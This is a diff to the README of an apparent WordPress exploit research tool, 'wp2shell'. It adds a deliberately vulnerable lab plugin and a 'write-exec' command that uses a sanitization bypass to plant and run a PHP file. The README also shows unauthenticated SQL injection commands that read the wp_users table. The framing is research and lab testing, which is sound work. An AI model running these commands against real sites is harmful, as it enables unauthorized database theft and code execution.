@@ -48,6 +48,7 @@ wp2shell-research/
 │   ├── USAGE.md          # step-by-step usage
 │   ├── analysis.md       # full technical analysis + defensive measures
 │   └── weaponization-gap.md
+├── lab/acme-templates.php  # deliberately-vulnerable plugin for the write-exec demo
 ├── AUTHORIZATION.md
 ├── LICENSE               # MIT
 └── pyproject.toml
@@ -79,6 +80,11 @@ wp2shell sqli http://TARGET/
 
 # 3) Extract anything
 wp2shell sqli http://TARGET/ --expr "SELECT COUNT(*) FROM wp_users"
+
+# 4) Prove code execution (write a benign PHP file the server runs; needs a vulnerable
+#    plugin write route — install lab/acme-templates.php on a test instance first)
+wp2shell write-exec http://TARGET/
+#   [+] server EXECUTED the PHP -> 42-wp2shell-exec-poc
 ```
 
 ## Commands
@@ -89,6 +95,7 @@ wp2shell sqli http://TARGET/ --expr "SELECT COUNT(*) FROM wp_users"
 |---|---|---|
 | `check` | none | Detector — VULNERABLE / NOT VULNERABLE (exit 1 / 0). |
 | `sqli` | DB read | Unauthenticated UNION/blind SQL injection (CVE-2026-60137 via 63030). |
+| `write-exec` | code exec | Drops a benign PHP file (default: prints `6*7`) via the desync's sanitization bypass and proves the server **executes** it. Needs a vulnerable plugin write route — the bundled `lab/acme-templates.php` models one; auto-cleans the file. |
 
 **Research** — raw desync primitives for studying the bug (not scanners):
 
